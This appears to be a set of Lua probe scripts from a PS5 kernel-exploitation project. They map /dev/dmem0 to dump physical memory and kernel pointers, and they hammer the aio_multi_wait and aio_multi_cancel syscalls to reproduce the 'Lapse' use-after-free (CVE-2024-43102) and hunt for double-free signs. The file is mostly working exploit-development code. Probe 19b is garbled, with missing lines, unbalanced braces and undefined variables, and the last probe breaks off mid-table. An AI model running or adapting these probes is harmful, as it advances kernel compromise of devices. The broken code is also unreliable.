```lua
-- 14.10 Recon Probe 18: Extract physical addresses from GPU page tables
-- and mmap dmem0 at those offsets to read kernel data structures
-- Probe 17 found dense data at dmem0 offset 0x10000-0x18000 with
-- values like 0x0000000200b60000 that look like physical addresses

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: DMEM PHYS ADDR SCAN ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_open = 5, sc_close = 6,
    sc_mmap = 477, sc_munmap = 73,
    sc_getpid = 20,
})

local dmem_fd = -1
local ok, ret = pcall(function() return syscall.sc_open("/dev/dmem0", 0):tonumber() end)
if ok and ret >= 0 then dmem_fd = ret end
log("dmem0 fd: " .. dmem_fd)

local PAGE = 0x4000
local PROT_READ = 1
local MAP_SHARED = 1

-- ============================================================
-- PART 1: Extract all address-like values from 0x10000-0x18000
-- ============================================================
log("")
log("--- PART 1: extract addresses from GPU tables ---")

local phys_addrs = {}
local seen = {}

for base_off = 0x10000, 0x17FFF, PAGE do
    local m_ok, m_ret = pcall(function()
        return syscall.sc_mmap(0, PAGE, PROT_READ, MAP_SHARED, dmem_fd, base_off)
    end)
    if not m_ok then
        log(string.format("  off=0x%x: mmap failed", base_off))
    else
        local addr = m_ret:tonumber()
        if addr == 0 or addr == 0xFFFFFFFFFFFFFFFF then
            log(string.format("  off=0x%x: mmap returned invalid", base_off))
        else
            local page_nz = 0
            for i = 0, PAGE - 8, 8 do
                local lo = memory.read_dword(addr + i):tonumber()
                local hi = memory.read_dword(addr + i + 4):tonumber()
                local val_lo = lo
                local val_hi = hi

                if lo ~= 0 or hi ~= 0 then
                    page_nz = page_nz + 1

                    -- Physical addresses on PS5:
                    -- RAM: 0x000000000 - 0x3FFFFFFFF (16GB)
                    -- MMIO: 0x0000000xx_xxxxxxxx (device specific)
                    -- Look for values in plausible physical ranges
                    -- hi=0-3 with nonzero lo = plausible 16GB phys addr
                    -- Also page-aligned values (low 12 bits = 0)
                    if hi >= 0 and hi <= 4 and (lo ~= 0 or hi ~= 0) then
                        -- Reconstruct 64-bit value
                        -- Check if it looks page-aligned (low 12 bits zero)
                        local full_lo = lo
                        local is_aligned = (lo % 4096 == 0)
                        -- Must be > 0x1000 to not be null-ish
                        if (hi > 0 or lo > 0x10000) and hi <= 4 then
                            local key = string.format("%08x%08x", hi, lo)
                            if not seen[key] then
                                seen[key] = true
                                phys_addrs[#phys_addrs + 1] = {
                                    src_off = base_off + i,
                                    hi = hi, lo = lo,
                                    aligned = is_aligned
                                }
                            end
                        end
                    end
                end
            end
            log(string.format("  off=0x%x: %d nonzero qwords, %d new phys addrs",
                base_off, page_nz, #phys_addrs))
            pcall(function() syscall.sc_munmap(addr, PAGE) end)
        end
    end
end

log("")
log("total unique physical addresses found: " .. #phys_addrs)

-- Sort by address value
table.sort(phys_addrs, function(a, b)
    if a.hi ~= b.hi then return a.hi < b.hi end
    return a.lo < b.lo
end)

-- Print them all (capped at 60)
for i = 1, math.min(60, #phys_addrs) do
    local p = phys_addrs[i]
    log(string.format("  0x%08x%08x from +0x%05x %s",
        p.hi, p.lo, p.src_off, p.aligned and "ALIGNED" or ""))
end
if #phys_addrs > 60 then log("  ... (" .. #phys_addrs .. " total)") end

-- ============================================================
-- PART 2: mmap dmem0 at extracted physical addresses
-- If dmem0's mmap offset maps to physical memory, we can
-- read whatever is at those physical addresses
-- ============================================================
log("")
log("--- PART 2: mmap at physical offsets ---")

-- Pick the most interesting addresses: page-aligned, unique high bytes
local test_addrs = {}
local hi_seen = {}

-- First: all page-aligned addresses
for _, p in ipairs(phys_addrs) do
    if p.aligned and #test_addrs < 30 then
        local hkey = p.hi
        test_addrs[#test_addrs + 1] = p
    end
end

log("testing " .. #test_addrs .. " page-aligned addresses...")

for _, p in ipairs(test_addrs) do
    -- The mmap offset is a 64-bit value: hi*2^32 + lo
    -- Lua numbers are doubles, good up to 2^53
    local offset = p.hi * 4294967296 + p.lo

    local m_ok2, m_ret2 = pcall(function()
        return syscall.sc_mmap(0, PAGE, PROT_READ, MAP_SHARED, dmem_fd, offset)
    end)
    local mapped = 0
    if m_ok2 then mapped = m_ret2:tonumber() end

    if mapped ~= 0 and mapped ~= 0xFFFFFFFFFFFFFFFF then
        -- Read first 64 bytes
        local q = {}
        for j = 0, 56, 8 do
            local lo2 = memory.read_dword(mapped + j):tonumber()
            local hi2 = memory.read_dword(mapped + j + 4):tonumber()
            if lo2 ~= 0 or hi2 ~= 0 then
                q[#q + 1] = string.format("%08x%08x", hi2, lo2)
            end
        end

        -- Count kernel pointers in full page
        local kptrs = 0
        local dmap_ptrs = 0
        local nz = 0
        for j = 0, PAGE - 8, 8 do
            local lo2 = memory.read_dword(mapped + j):tonumber()
            local hi2 = memory.read_dword(mapped + j + 4):tonumber()
            if lo2 ~= 0 or hi2 ~= 0 then nz = nz + 1 end
            if hi2 >= 0xFFFFFFFF then kptrs = kptrs + 1 end
            if hi2 >= 0xFFFFF800 and hi2 < 0xFFFFFF00 then dmap_ptrs = dmap_ptrs + 1 end
        end

        -- Look for ASCII strings
        local str_count = 0
        local first_str = ""
        local cur = {}
        for j = 0, math.min(PAGE - 1, 2047) do
            local b = memory.read_byte(mapped + j):tonumber()
            if b >= 32 and b < 127 then
                cur[#cur + 1] = string.char(b)
            else
                if #cur >= 4 then
                    str_count = str_count + 1
                    if first_str == "" then first_str = table.concat(cur) end
                end
                cur = {}
            end
        end

        local tag = ""
        if kptrs > 0 then tag = tag .. " KPTRS:" .. kptrs end
        if dmap_ptrs > 0 then tag = tag .. " DMAP:" .. dmap_ptrs end
        if str_count > 0 then tag = tag .. " STR:" .. str_count end

        log(string.format("  phys=0x%08x%08x: MAPPED nz=%d%s",
            p.hi, p.lo, nz, tag))
        if #q > 0 then
            log("    first: " .. table.concat(q, " "):sub(1, 120))
        end
        if first_str ~= "" then
            log("    str: \"" .. first_str:sub(1, 60) .. "\"")
        end

        -- Deep dump if kernel pointers found
        if kptrs > 0 or dmap_ptrs > 0 then
            log("    === KERNEL DATA FOUND ===")
            for j = 0, PAGE - 8, 8 do
                local lo2 = memory.read_dword(mapped + j):tonumber()
                local hi2 = memory.read_dword(mapped + j + 4):tonumber()
                if hi2 >= 0xFFFFF000 then
                    local ktag = "KHIGH"
                    if hi2 >= 0xFFFFFFFF and lo2 >= 0x80000000 then
                        ktag = "KTEXT"
                    elseif hi2 >= 0xFFFFF800 and hi2 < 0xFFFFFF00 then
                        ktag = "DMAP"
                    end
                    log(string.format("      +%04x: 0x%08x%08x [%s]", j, hi2, lo2, ktag))
                end
            end
        end

        -- Deep dump if strings found (process names, driver names)
        if str_count > 2 then
            log("    strings:")
            cur = {}
            for j = 0, math.min(PAGE - 1, 4095) do
                local b = memory.read_byte(mapped + j):tonumber()
                if b >= 32 and b < 127 then
                    cur[#cur + 1] = string.char(b)
                else
                    if #cur >= 4 then
                        log("      +0x" .. string.format("%04x", j - #cur) ..
                            ": \"" .. table.concat(cur):sub(1, 80) .. "\"")
                    end
                    cur = {}
                end
            end
        end

        pcall(function() syscall.sc_munmap(mapped, PAGE) end)
    else
        -- Only log failures for interesting addresses
        if p.hi > 0 then
            log(string.format("  phys=0x%08x%08x: FAILED", p.hi, p.lo))
        end
    end
end

-- ============================================================
-- PART 3: Try well-known physical address ranges directly
-- On x86_64, low physical memory (<1MB) has BIOS/ACPI tables
-- Physical 0x1000-0x100000: real-mode IVT, BIOS data, ACPI
-- ============================================================
log("")
log("--- PART 3: well-known physical ranges ---")

local known_phys = {
    {0x0,        "phys 0 (null page)"},
    {0x1000,     "phys 0x1000 (real-mode IVT)"},
    {0x7C00,     "phys 0x7C00 (boot sector)"},
    {0x80000,    "phys 0x80000 (EBDA)"},
    {0xF0000,    "phys 0xF0000 (BIOS ROM shadow)"},
    {0x100000,   "phys 1MB (kernel load area)"},
    {0x200000,   "phys 2MB"},
    {0x1000000,  "phys 16MB"},
    {0x10000000, "phys 256MB"},
    {0x80000000, "phys 2GB"},
    {0x100000000, "phys 4GB"},
    {0x180000000, "phys 6GB"},
    {0x200000000, "phys 8GB"},
    {0x300000000, "phys 12GB"},
}

for _, spec in ipairs(known_phys) do
    local offset = spec[1]
    local label = spec[2]

    local m3_ok, m3_ret = pcall(function()
        return syscall.sc_mmap(0, PAGE, PROT_READ, MAP_SHARED, dmem_fd, offset)
    end)
    local a3 = 0
    if m3_ok then a3 = m3_ret:tonumber() end

    if a3 ~= 0 and a3 ~= 0xFFFFFFFFFFFFFFFF then
        local q0lo = memory.read_dword(a3):tonumber()
        local q0hi = memory.read_dword(a3 + 4):tonumber()

        -- Count content
        local nz3 = 0
        local kp3 = 0
        for j = 0, PAGE - 8, 64 do
            local lo3 = memory.read_dword(a3 + j):tonumber()
            local hi3 = memory.read_dword(a3 + j + 4):tonumber()
            if lo3 ~= 0 or hi3 ~= 0 then nz3 = nz3 + 1 end
            if hi3 >= 0xFFFF0000 then kp3 = kp3 + 1 end
        end

        local tag3 = ""
        if kp3 > 0 then tag3 = " KPTRS:" .. kp3 end

        log(string.format("  %-30s MAPPED nz=%d%s first=%08x%08x",
            label, nz3, tag3, q0hi, q0lo))

        -- If we find kernel pointers, dump them
        if kp3 > 0 then
            for j = 0, PAGE - 8, 8 do
                local lo3 = memory.read_dword(a3 + j):tonumber()
                local hi3 = memory.read_dword(a3 + j + 4):tonumber()
                if hi3 >= 0xFFFF0000 then
                    log(string.format("    +%04x: 0x%08x%08x", j, hi3, lo3))
                end
            end
        end

        -- Look for strings at BIOS/ACPI ranges
        if offset >= 0xF0000 and offset <= 0x100000 then
            local strs = {}
            cur = {}
            for j = 0, math.min(PAGE - 1, 4095) do
                local b3 = memory.read_byte(a3 + j):tonumber()
                if b3 >= 32 and b3 < 127 then
                    cur[#cur + 1] = string.char(b3)
                else
                    if #cur >= 4 then
                        strs[#strs + 1] = {off = j - #cur, s = table.concat(cur)}
                    end
                    cur = {}
                end
            end

                for _, s in ipairs(strs) do
                    log("    +" .. string.format("%04x", s.off) ..
                        ": \"" .. s.s:sub(1, 60) .. "\"")

            end
        end

        pcall(function() syscall.sc_munmap(a3, PAGE) end)
    else
        log(string.format("  %-30s FAILED", label))
    end
end

pcall(function() syscall.sc_close(dmem_fd) end)
```

## probes/phase2_kernel_objects/19_aio_stress.lua

```lua
-- 14.10 Recon Probe 19: AIO syscall stress test
-- The Lapse exploit used aio_multi_wait race with kqueue to trigger UAF
-- CVE-2024-43102: race between aio completion and kqueue event delivery
-- Single-threaded approach: submit many AIOs on pipes, then cancel/wait
-- interleaved to stress the kernel's AIO completion + cleanup paths
-- SAFE: uses pipes (no external I/O), careful with argument validation

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: AIO STRESS ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_pipe = 42,
    sc_close = 6,
    sc_read = 3,
    sc_write = 4,
    sc_aio_read = 255,
    sc_aio_return = 314,
    sc_aio_error = 315,
    sc_aio_cancel = 316,
    sc_aio_suspend = 315,  -- actually 341 on FreeBSD
    sc_aio_waitcomplete = 359,
    sc_aio_multi_wait = 587,   -- PS5 specific
    sc_aio_multi_cancel = 588, -- PS5 specific
    sc_socket = 97,
    sc_socketpair = 135,
    sc_getpid = 20,
    sc_mmap = 477,
})

-- ============================================================
-- PART 1: Create pipe pairs for AIO targets
-- ============================================================
log("")
log("--- PART 1: setup pipes ---")

local pipes = {}
local NPIPES = 20

for i = 1, NPIPES do
    local fds = memory.alloc(8)
    local ok = pcall(function() syscall.sc_pipe(fds) end)
    if ok then
        local rfd = memory.read_dword(fds):tonumber()
        local wfd = memory.read_dword(fds + 4):tonumber()
        pipes[#pipes + 1] = {rfd = rfd, wfd = wfd}
    end
end
log("  created " .. #pipes .. "/" .. NPIPES .. " pipe pairs")

if #pipes < 2 then
    log("FATAL: not enough pipes")
    return table.concat(out, "\n")
end

-- Write some data into each pipe so aio_read has something to complete on
for i, p in ipairs(pipes) do
    local wbuf = memory.alloc(64)
    for j = 0, 63 do
        memory.write_byte(wbuf + j, (i * 7 + j) % 256)
    end
    pcall(function() syscall.sc_write(p.wfd, wbuf, 64) end)
end
log("  wrote 64 bytes into each pipe")

-- ============================================================
-- PART 2: Test basic aio_read on a pipe
-- struct aiocb: fd(4) + pad(4) + offset(8) + buf(8) + nbytes(8)
--              + _1(4) + _2(4) + opcode(4) + reqprio(4) + _aiocb_private(?)
-- FreeBSD struct aiocb is ~168 bytes
-- ============================================================
log("")
log("--- PART 2: basic aio_read ---")

local AIOCB_SIZE = 256
local aiocb = memory.alloc(AIOCB_SIZE)
local readbuf = memory.alloc(4096)

-- Zero the aiocb
for i = 0, AIOCB_SIZE - 1, 8 do
    memory.write_qword(aiocb + i, 0)
end

-- Fill aiocb for pipe read
-- FreeBSD struct aiocb layout:
-- +0:  aio_fildes (int)
-- +8:  aio_offset (off_t, 8 bytes)
-- +16: aio_buf (volatile void*, 8 bytes)
-- +24: aio_nbytes (size_t, 8 bytes)
-- +32: aio_sigevent (struct sigevent, ~32 bytes)
-- +72: aio_lio_opcode (int)
-- +76: aio_reqprio (int)
-- +80: _aiocb_private (struct __aiocb_private, ~88 bytes)

memory.write_dword(aiocb, pipes[1].rfd)       -- aio_fildes
memory.write_qword(aiocb + 8, 0)              -- aio_offset
memory.write_qword(aiocb + 16, readbuf)       -- aio_buf
memory.write_qword(aiocb + 24, 64)            -- aio_nbytes

local aio_ok, aio_err = pcall(function()
    return syscall.sc_aio_read(aiocb)
end)
log("  aio_read: " .. (aio_ok and "OK rv=" .. aio_err:tonumber() or "ERR: " .. tostring(aio_err):sub(1, 40)))

-- Check aio_error
if aio_ok then
    local aerr_ok, aerr_ret = pcall(function()
        return syscall.sc_aio_error(aiocb)
    end)
    if aerr_ok then
        log("  aio_error: " .. aerr_ret:tonumber())
    end

    -- Get return value
    local aret_ok, aret_ret = pcall(function()
        return syscall.sc_aio_return(aiocb)
    end)
    if aret_ok then
        log("  aio_return: " .. aret_ret:tonumber())
        -- Check if data was read
        local b0 = memory.read_byte(readbuf):tonumber()
        local b1 = memory.read_byte(readbuf + 1):tonumber()
        log(string.format("  data: %02x %02x ...", b0, b1))
    end
end

-- ============================================================
-- PART 3: aio_multi_wait — PS5-specific batch AIO wait
-- This is the syscall the Lapse exploit targeted
-- ============================================================
log("")
log("--- PART 3: aio_multi_wait ---")

-- Submit multiple aio_reads
local aiocbs = {}
local aio_bufs = {}
for i = 1, 8 do
    local cb = memory.alloc(AIOCB_SIZE)
    local buf = memory.alloc(128)
    for j = 0, AIOCB_SIZE - 1, 8 do memory.write_qword(cb + j, 0) end

    local pipe_idx = ((i - 1) % #pipes) + 1
    memory.write_dword(cb, pipes[pipe_idx].rfd)
    memory.write_qword(cb + 8, 0)
    memory.write_qword(cb + 16, buf)
    memory.write_qword(cb + 24, 64)

    local s_ok = pcall(function() syscall.sc_aio_read(cb) end)
    if s_ok then
        aiocbs[#aiocbs + 1] = cb
        aio_bufs[#aio_bufs + 1] = buf
    end
end
log("  submitted " .. #aiocbs .. " aio_reads")

-- Build the array of aiocb pointers for aio_multi_wait
local cb_array = memory.alloc(#aiocbs * 8 + 8)
for i, cb in ipairs(aiocbs) do
    memory.write_qword(cb_array + (i - 1) * 8, cb)
end

-- aio_multi_wait(aiocb_list, nent, timeout_or_flags?)
-- The exact prototype is PS5-specific. Try with just the array and count.
local mw_ok, mw_err = pcall(function()
    return syscall.sc_aio_multi_wait(cb_array, #aiocbs, 0, 0, 0, 0)
end)
log("  aio_multi_wait(" .. #aiocbs .. "): " ..
    (mw_ok and "rv=" .. mw_err:tonumber() or "ERR: " .. tostring(mw_err):sub(1, 40)))

-- Collect results
for i, cb in ipairs(aiocbs) do
    local re_ok, re_ret = pcall(function() return syscall.sc_aio_return(cb) end)
    if re_ok then
        local nbytes = re_ret:tonumber()
        if nbytes > 0 then
            log("    aio[" .. i .. "]: " .. nbytes .. " bytes read")
        end
    end
end

-- ============================================================
-- PART 4: aio_multi_cancel stress
-- Cancel AIOs that may be in-flight or already completed
-- This stresses the kernel's AIO cleanup/refcount path
-- ============================================================
log("")
log("--- PART 4: aio_multi_cancel stress ---")

-- Refill pipes
for i, p in ipairs(pipes) do
    local wbuf = memory.alloc(64)
    for j = 0, 63 do memory.write_byte(wbuf + j, 0x42) end
    pcall(function() syscall.sc_write(p.wfd, wbuf, 64) end)
end

-- Submit a batch, then immediately cancel
local cancel_ok_count = 0
local cancel_err_count = 0

for round = 1, 50 do
    -- Submit
    local cbs = {}
    for i = 1, 4 do
        local cb = memory.alloc(AIOCB_SIZE)
        local buf = memory.alloc(128)
        for j = 0, AIOCB_SIZE - 1, 8 do memory.write_qword(cb + j, 0) end

        local pidx = ((round * 4 + i) % #pipes) + 1
        memory.write_dword(cb, pipes[pidx].rfd)
        memory.write_qword(cb + 16, buf)
        memory.write_qword(cb + 24, 32)

        pcall(function() syscall.sc_aio_read(cb) end)
        cbs[#cbs + 1] = cb
    end

    -- Build cancel array
    local cancel_arr = memory.alloc(#cbs * 8)
    for i, cb in ipairs(cbs) do
        memory.write_qword(cancel_arr + (i - 1) * 8, cb)
    end

    -- Cancel
    local mc_ok, mc_ret = pcall(function()
        return syscall.sc_aio_multi_cancel(cancel_arr, #cbs, 0, 0, 0, 0)
    end)
    if mc_ok then
        cancel_ok_count = cancel_ok_count + 1
    else
        cancel_err_count = cancel_err_count + 1
    end

    -- Also try aio_return on cancelled AIOs (double-free probe)
    for _, cb in ipairs(cbs) do
        pcall(function() syscall.sc_aio_return(cb) end)
    end

    -- Refill a pipe if needed
    if round % 5 == 0 then
        local pidx = (round % #pipes) + 1
        local wb = memory.alloc(64)
        for j = 0, 63 do memory.write_byte(wb + j, 0x43) end
        pcall(function() syscall.sc_write(pipes[pidx].wfd, wb, 64) end)
    end
end

log("  50 rounds: cancel_ok=" .. cancel_ok_count .. " cancel_err=" .. cancel_err_count)

-- ============================================================
-- PART 5: Submit-wait-cancel interleave (Lapse-like pattern)
-- The original bug: aio completes and delivers kqueue event
-- while another thread cancels it — refcount goes to -1 -> UAF
-- Single-threaded approximation: submit, partial wait, cancel
-- ============================================================
log("")
log("--- PART 5: submit-wait-cancel interleave ---")

local swc_ok = 0
local swc_err = 0

for round = 1, 100 do
    -- Submit 2 aio_reads on different pipes
    local cb1 = memory.alloc(AIOCB_SIZE)
    local cb2 = memory.alloc(AIOCB_SIZE)
    local buf1 = memory.alloc(128)
    local buf2 = memory.alloc(128)

    for j = 0, AIOCB_SIZE - 1, 8 do
        memory.write_qword(cb1 + j, 0)
        memory.write_qword(cb2 + j, 0)
    end

    local p1 = pipes[(round % #pipes) + 1]
    local p2 = pipes[((round + 1) % #pipes) + 1]

    memory.write_dword(cb1, p1.rfd)
    memory.write_qword(cb1 + 16, buf1)
    memory.write_qword(cb1 + 24, 32)

    memory.write_dword(cb2, p2.rfd)
    memory.write_qword(cb2 + 16, buf2)
    memory.write_qword(cb2 + 24, 32)

    pcall(function() syscall.sc_aio_read(cb1) end)
    pcall(function() syscall.sc_aio_read(cb2) end)

    -- Wait for cb1 only (with timeout 0 = non-blocking)
    local wait_arr = memory.alloc(16)
    memory.write_qword(wait_arr, cb1)

    local ts = memory.alloc(16)
    memory.write_qword(ts, 0)
    memory.write_qword(ts + 8, 1) -- 1 nanosecond timeout

    pcall(function()
        syscall.sc_aio_multi_wait(wait_arr, 1, ts, 0, 0, 0)
    end)

    -- Immediately cancel cb2 (might be completed or in-flight)
    local cancel_arr2 = memory.alloc(8)
    memory.write_qword(cancel_arr2, cb2)
    pcall(function()
        syscall.sc_aio_multi_cancel(cancel_arr2, 1, 0, 0, 0, 0)
    end)

    -- Collect cb1 result
    pcall(function() syscall.sc_aio_return(cb1) end)

    -- Double-collect cb2 (cancelled — should return ECANCELED or error)
    local d_ok, d_ret = pcall(function()
        return syscall.sc_aio_return(cb2)
    end)
    if d_ok then
        local drv = d_ret:tonumber()
        if drv >= 0 then
            swc_ok = swc_ok + 1
        else
            swc_err = swc_err + 1
        end
    else
        swc_err = swc_err + 1
    end

    -- Try aio_return AGAIN on cb2 (should fail — already collected)
    -- If this succeeds, it's a double-free indicator
    local dd_ok, dd_ret = pcall(function()
        return syscall.sc_aio_return(cb2)
    end)
    if dd_ok and dd_ret:tonumber() >= 0 then
        log("  *** DOUBLE aio_return succeeded at round " .. round .. "! ***")
    end

    -- Refill pipes periodically
    if round % 10 == 0 then
        for _, p in ipairs(pipes) do
            local wb = memory.alloc(64)
            for j = 0, 63 do memory.write_byte(wb + j, 0x44) end
            pcall(function() syscall.sc_write(p.wfd, wb, 64) end)
        end
    end
end

log("  100 rounds: ok=" .. swc_ok .. " err=" .. swc_err)

-- ============================================================
-- PART 6: aio_cancel on already-completed AIO
-- If the kernel doesn't check completion state before cancelling,
-- it might free a buffer that's already been returned to the caller
-- ============================================================
log("")
log("--- PART 6: cancel after completion ---")

local cac_double = 0
for round = 1, 100 do
    local cb = memory.alloc(AIOCB_SIZE)
    local buf = memory.alloc(128)
    for j = 0, AIOCB_SIZE - 1, 8 do memory.write_qword(cb + j, 0) end

    local pidx = (round % #pipes) + 1
    memory.write_dword(cb, pipes[pidx].rfd)
    memory.write_qword(cb + 16, buf)
    memory.write_qword(cb + 24, 16)

    -- Submit
    pcall(function() syscall.sc_aio_read(cb) end)

    -- Wait for completion (data is in the pipe, should complete fast)
    local w_arr = memory.alloc(8)
    memory.write_qword(w_arr, cb)
    pcall(function() syscall.sc_aio_multi_wait(w_arr, 1, 0, 0, 0, 0) end)

    -- Collect the result
    pcall(function() syscall.sc_aio_return(cb) end)

    -- NOW cancel it (already completed and collected)
    local c_arr = memory.alloc(8)
    memory.write_qword(c_arr, cb)
    local c_ok, c_ret = pcall(function()
        return syscall.sc_aio_multi_cancel(c_arr, 1, 0, 0, 0, 0)
    end)

    -- And try to collect AGAIN
    local r2_ok, r2_ret = pcall(function()
        return syscall.sc_aio_return(cb)
    end)
    if r2_ok and r2_ret:tonumber() >= 0 then
        cac_double = cac_double + 1
    end

    -- Refill
    if round % 10 == 0 then
        local wb = memory.alloc(64)
        for j = 0, 63 do memory.write_byte(wb + j, 0x44) end
        pcall(function() syscall.sc_write(pipes[pidx].wfd, wb, 64) end)
    end
end

log("  100 rounds, double-return after cancel: " .. cac_double)
if cac_double > 0 then
    log("  *** POTENTIAL UAF: aio_return succeeded after cancel+return ***")
end

-- ============================================================
-- PART 7: socketpair AIO (different code path than pipes)
-- ============================================================
log("")
log("--- PART 7: socketpair AIO ---")

local sp_fds = memory.alloc(8)
local sp_ok = pcall(function()
    syscall.sc_socketpair(1, 1, 0, sp_fds) -- AF_UNIX, SOCK_STREAM
end)

if sp_ok then
    local sp0 = memory.read_dword(sp_fds):tonumber()
    local sp1 = memory.read_dword(sp_fds + 4):tonumber()
    log("  socketpair: " .. sp0 .. ", " .. sp1)

    -- Write data
    local spw = memory.alloc(64)
    for j = 0, 63 do memory.write_byte(spw + j, 0x55) end
    pcall(function() syscall.sc_write(sp1, spw, 64) end)

    -- AIO read from socket
    local spcb = memory.alloc(AIOCB_SIZE)
    local spbuf = memory.alloc(128)
    for j = 0, AIOCB_SIZE - 1, 8 do memory.write_qword(spcb + j, 0) end

    memory.write_dword(spcb, sp0)
    memory.write_qword(spcb + 16, spbuf)
    memory.write_qword(spcb + 24, 64)

    local sp_aio_ok, sp_aio_err = pcall(function()
        return syscall.sc_aio_read(spcb)
    end)
    log("  aio_read on socket: " ..
        (sp_aio_ok and "rv=" .. sp_aio_err:tonumber() or "ERR: " .. tostring(sp_aio_err):sub(1, 40)))

    if sp_aio_ok then
        -- Wait
        local sp_warr = memory.alloc(8)
        memory.write_qword(sp_warr, spcb)
        pcall(function() syscall.sc_aio_multi_wait(sp_warr, 1, 0, 0, 0, 0) end)

        -- Return
        local sp_ret_ok, sp_ret_val = pcall(function()
            return syscall.sc_aio_return(spcb)
        end)
        if sp_ret_ok then
            log("  aio_return: " .. sp_ret_val:tonumber())
            if sp_ret_val:tonumber() > 0 then
                local b0 = memory.read_byte(spbuf):tonumber()
                log(string.format("  data: 0x%02x (expected 0x55)", b0))
            end
        end
    end

    pcall(function() syscall.sc_close(sp0) end)
    pcall(function() syscall.sc_close(sp1) end)
else
    log("  socketpair failed")
end

-- Cleanup
for _, p in ipairs(pipes) do
    pcall(function() syscall.sc_close(p.rfd) end)
    pcall(function() syscall.sc_close(p.wfd) end)
end

log("")
log("=== AIO STRESS DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
```

```lua
-- 14.10 Recon Probe 19b: Safe AIO exploration
-- Probe 19 crashed at aio_read — likely wrong struct aiocb layout
-- This probe: (1) checks which AIO syscalls resolve, (2) tries aio_read
-- with carefully built aiocb, (3) tests aio_cancel with fd-based API

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("pid: " .. syscall.getpid():tonumber())

    sc_pipe = 42,
    sc_close = 6,
    sc_read = 3,
    sc_write = 4,
    sc_socket = 97,
    sc_socketpair = 135,
    sc_getpid = 20,
    sc_mmap = 477,
})

    {255, "aio_read"},
    {256, "aio_write"},
    {314, "aio_return"},
    {315, "aio_error"},     -- note: some sources say 317
    {316, "aio_cancel"},
    {317, "aio_error_alt"},
    {321, "aio_waitcomplete"},
    {341, "aio_suspend"},
    {359, "aio_waitcomplete2"},
    {587, "aio_multi_wait"},
    {588, "aio_multi_cancel"},
    {589, "aio_multi_delete"},
    {590, "aio_multi_poll"},
}

for _, spec in ipairs(aio_nums) do

    local name = spec[2]
    local tbl = {}

    local rok = pcall(function() syscall.resolve(tbl) end)
    log(string.format("  %d %-25s %s", num, name, rok and "OK" or "FAIL"))
end

-- Now resolve the ones we'll use
syscall.resolve({
    sc_aio_read = 255,
    sc_aio_write = 256,
    sc_aio_return = 314,
    sc_aio_error = 315,
    sc_aio_cancel = 316,
    sc_aio_multi_wait = 587,
    sc_aio_multi_cancel = 588,

-- PART 2: Create a pipe and test basic aio_read

local wfd = memory.read_dword(fds + 4):tonumber()

local wok, wret = pcall(function() return syscall.sc_write(wfd, wbuf, 32) end)
log("  write: " .. (wok and wret:tonumber() or "FAIL"))

-- FreeBSD 13 struct aiocb (from sys/aio.h):
--   int      aio_fildes;     // +0  (4 bytes)
--   // padding to align off_t  // +4  (4 bytes on LP64)
--   off_t    aio_offset;     // +8  (8 bytes)
--   volatile void *aio_buf;  // +16 (8 bytes)
--   size_t   aio_nbytes;     // +24 (8 bytes)
--   int      aio_reqprio;    // +32 (4 bytes)
--   struct sigevent aio_sigevent; // +40 (varies)
--   int      aio_lio_opcode; // after sigevent
--   struct __aiocb_private _aiocb_private;
-- Total ~168 bytes on FreeBSD

local rbuf = memory.alloc(256)

    memory.write_qword(aiocb + i, 0)
end

end

memory.write_qword(aiocb + 8, 0)           -- aio_offset
memory.write_qword(aiocb + 16, rbuf)       -- aio_buf
memory.write_qword(aiocb + 24, 32)         -- aio_nbytes

local aio_ok, aio_ret = pcall(function()

end)

    -- Check aio_error
    local aerr_ok, aerr = pcall(function() return syscall.sc_aio_error(aiocb) end)
    if aerr_ok then log("  aio_error=" .. aerr:tonumber()) end

    -- Check aio_return
    local aret_ok, aret = pcall(function() return syscall.sc_aio_return(aiocb) end)
    if aret_ok then log("  aio_return=" .. aret:tonumber()) end

end

log("--- PART 3: aio_cancel fd-only ---")

-- Create another pipe
local fds2 = memory.alloc(8)
syscall.sc_pipe(fds2)
local rfd2 = memory.read_dword(fds2):tonumber()

-- ============================================================

local empty_arr = memory.alloc(64)

local mw_tests = {
    {"(arr,0,0,0,0,0)", function() return syscall.sc_aio_multi_wait(empty_arr, 0, 0, 0, 0, 0) end},
    {"(arr,0,0)", function() return syscall.sc_aio_multi_wait(empty_arr, 0, 0) end},
    {"(0,0,0,0,0,0)", function() return syscall.sc_aio_multi_wait(0, 0, 0, 0, 0, 0) end},
}

for _, t in ipairs(mw_tests) do

    local fn = t[2]
    local ok2, ret2 = pcall(fn)
    log("  aio_multi_wait" .. label .. ": " ..

-- ============================================================
-- PART 5: aio_multi_cancel prototype test
-- ============================================================

log("--- PART 5: aio_multi_cancel prototype test ---")

    {"(arr,0,0,0,0,0)", function() return syscall.sc_aio_multi_cancel(empty_arr, 0, 0, 0, 0, 0) end},
    {"(0,0,0,0,0,0)", function() return syscall.sc_aio_multi_cancel(0, 0, 0, 0, 0, 0) end},
}

for _, t in ipairs(mc_tests) do
    local label = t[1]
    local fn = t[2]
    local ok3, ret3 = pcall(fn)
    log("  aio_multi_cancel" .. label .. ": " ..
        (ok3 and "rv=" .. ret3:tonumber() or "ERR: " .. tostring(ret3):sub(1, 40)))
end

-- ============================================================
-- PART 6: If aio_read worked, stress test it
-- ============================================================
log("")
log("--- PART 6: aio stress (if read works) ---")

if aio_ok then
    log("  aio_read worked, running stress...")

    -- Write more data
    for round = 1, 10 do
        pcall(function() syscall.sc_write(wfd, wbuf, 32) end)

        end
    end
```

## probes/phase2_kernel_objects/19c_aio_pipes.lua

```lua
-- 14.10 Recon Probe 19c: AIO with correct pipe/socket FD creation
-- 19b showed: pipe(fds) returns rfd=0 wfd=0 — the pointer arg doesn't work
-- The syscall.resolve pattern returns FDs via syscall return value
-- Alternative: use socketpair which DOES use a pointer output on FreeBSD
-- Or use /dev/null, stdin/stdout which are already open

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: AIO PIPES FIX ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_pipe = 42,
    sc_close = 6,
    sc_read = 3,
    sc_write = 4,
    sc_open = 5,
